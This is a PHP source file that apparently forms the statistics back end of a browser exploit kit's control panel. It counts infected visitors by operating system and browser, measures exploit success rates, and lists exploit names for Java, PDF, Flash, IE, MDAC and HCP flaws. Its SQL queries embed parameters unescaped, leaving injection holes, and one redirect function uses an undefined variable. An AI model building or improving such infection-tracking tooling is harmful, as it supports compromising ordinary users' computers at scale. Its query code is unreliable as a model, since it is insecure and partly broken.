<?php

function hsc( $str ) {
    return htmlspecialchars( htmlspecialchars_decode( $str, ENT_QUOTES ), ENT_QUOTES );
}

function do404() {
    header("Location: ".$NONUNIQUEURL);
    exit( );
}

//redirect user to specific ip
function redir( $url ) {
    ob_clean( );
    header( "HTTP/1.1 302 Found" );
    header( "Location: {$url}" );
    exit( );
}

function doprc( $part, $total ) {
    if ( $total == 0 ) {
        return "0%";
    }
    return round( $part / $total * 100, 2 )."%";
}
function total_no_of_hits($connection)
{
   $r = mysqli_query( $connection,"SELECT * FROM stats" );
   $rnum=$r->num_rows;
   return $rnum;   
}
function total_no_of_exploits($connection)
{
   $r = mysqli_query( $connection,"SELECT * FROM exploitdb" );
   $rnum=$r->num_rows;
   return $rnum;   
}
function total_no_of_visits($connection)
{
   $r = mysqli_query( $connection,"SELECT * FROM analytics" );
   $rnum=$r->num_rows;
   return $rnum;   
}
function platform_infected($connection,$col)
{
   $r = mysqli_query( $connection,"SELECT * FROM stats WHERE osver='{$col}'" );
   $rnum=$r->num_rows;
   return $rnum;   
}
function browser_infected($connection,$col)
{
   $r = mysqli_query( $connection,"SELECT * FROM stats WHERE browtype='{$col}'" );
   $rnum=$r->num_rows;
   return $rnum;   
}
function getTable($connection,$col)
{
   $r = mysqli_query( $connection,"SELECT id,browtype,browver,osver,mac,client FROM stats WHERE id={$col}" );
   $row = mysqli_fetch_row( $r );
   return $row;
}
function getAnalytics($connection,$col)
{
   $r = mysqli_query( $connection,"SELECT id,today_date,no_of_visitors,no_of_hits FROM analytics WHERE id={$col}" );
   $row = mysqli_fetch_row( $r );
   return $row;
}
function getExploit($connection,$col)
{
   $r = mysqli_query( $connection,"SELECT * FROM exploitdb WHERE id={$col}" );
   $row = mysqli_fetch_row( $r );
   return $row;
}
function getstats( $connection,$col ) {
    $nms = array( );
    $ttl = array( );
    $eed = array( );
    $prc = array( );

	$r = mysqli_query( $connection,"SELECT DISTINCT {$col} FROM stats" );
    while ( $row = mysqli_fetch_row( $r ) ) {
        $nms[] = $row[0];
        $cnm = addslashes( $row[0] );
        $rt = mysqli_query( $connection,"SELECT COUNT(*) FROM stats WHERE {$col}='{$cnm}'" );
        $rowt = mysqli_fetch_row( $rt );
        $total = $rowt[0];
        $ttl[] = $total;
        $rt = mysqli_query( $connection,"SELECT COUNT(*) FROM stats WHERE {$col}='{$cnm}' AND hit!=0" );
        $rowt = mysqli_fetch_row( $rt );
        $exped = $rowt[0];
        $eed[] = $exped;
        $prc[] = doprc( $exped, $total );
    }
    array_multisort( $eed, SORT_DESC, $ttl, SORT_DESC, $nms, $prc );
    return array( $nms, $ttl, $eed, $prc );
}


function getexpstats($connection ) {
    global $SPLOITS;
    $nms = array( );
    $ttl = array( );
    $r = mysqli_query( $connection,"SELECT DISTINCT hit FROM stats WHERE hit!=0 ORDER BY hit ASC" );
    while ( $row = mysqli_fetch_row( $r ) ) {
        $nms[] = $SPLOITS[$row[0]];
        $cnm = addslashes( $row[0] );
        $rt = mysqli_query( $connection,"SELECT COUNT(*) FROM stats WHERE hit='{$cnm}'" );
        $rowt = mysqli_fetch_row( $rt );
        $ttl[] = $rowt[0];
    }
    return array( $nms, $ttl );
}
$SPLOITS = array(1 => "JAVA TC",  2 => "JAVA SMB", 3 => "HCP", 4 => "PDF COLLAB", 5 => "PDF PRINTF", 6 => "JAVA RMI", 7 => "FLASH 9", 8 => "PDF LIBTIFF", 9 => "JAVA MIDI", 10 => "JAVA SKYLINE", 11 => "IE CSS", 12 => "IEPEERS", 13 => "HACKING ATTEMPT", 14 => "HACKING ATTEMPT", 15 => "MDAC", 16 => "HACKING ATTEMPT", 17 => "HACKING ATTEMPT", 18 => "FLASH 10" );

?>